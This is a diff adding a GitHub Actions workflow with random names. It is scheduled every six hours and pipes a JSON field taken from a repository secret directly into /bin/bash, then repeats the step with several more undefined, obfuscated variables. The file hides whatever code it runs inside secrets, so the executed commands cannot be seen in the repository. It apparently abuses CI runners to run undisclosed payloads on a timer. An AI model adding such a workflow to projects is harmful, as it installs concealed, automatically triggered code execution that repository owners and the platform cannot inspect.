@@ -1,0 +1,24 @@
+name: xamiioyj
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '21 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xamiioyj
+        env:
+          kkkka6: ${{ secrets.kkkka6 }}
+        run: |
+          echo $kkkka6 | jq -r .tttv5 | /bin/bash
+          echo $uh15 | jq -r .gm771 | /bin/bash
+          echo $rbr3245 | jq -r .vfnl33 | /bin/bash
+          echo $qzws5303 | jq -r .nupy55 | /bin/bash
+          echo $st58030 | jq -r .q928 | /bin/bash
+          echo $sp13202 | jq -r .v38 | /bin/bash
+          echo $x5712 | jq -r .jrt0 | /bin/bash
+          echo $pxkc14244 | jq -r .xpob662 | /bin/bash
+
